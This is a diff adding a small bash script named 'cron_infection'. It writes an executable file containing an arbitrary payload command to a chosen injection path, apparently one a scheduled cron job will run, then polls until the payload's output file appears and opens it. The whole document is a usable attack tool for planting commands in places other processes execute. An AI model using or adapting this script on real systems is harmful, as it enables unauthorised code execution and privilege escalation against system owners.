@@ -1,0 +1,35 @@
+#! /bin/bash
+set -e
+
+declare -r target="${1}"
+declare -r payload="${2:-echo hello word}"
+declare -r output="${3:-$(pwd)/gift}"
+
+main() {
+    local dir="${target%\/*}"
+
+    if [ -z "$1" ]; then
+        printf "usage: ./cron_infection injection_path [payload] [output_path]\n" 1>&2
+        exit 1
+    fi
+    if [ ! -z "$dir" ]; then
+        mkdir -p "$dir"
+    fi
+    printf "#! /bin/bash\n$payload > $output" > "$target"
+    chmod +x "$target"
+    printf "file create at '%s'\n" "$target"
+    trap exit_scrip SIGINT
+    printf "watching $output ...\n"
+    until [ -f $output ]; do
+        sleep 5
+    done
+    printf "file found, open it\n"
+    cat $output | less
+}
+
+exit_scrip() {
+    printf "\noutput file not found\n"
+    exit 3
+}
+
+main "$@"
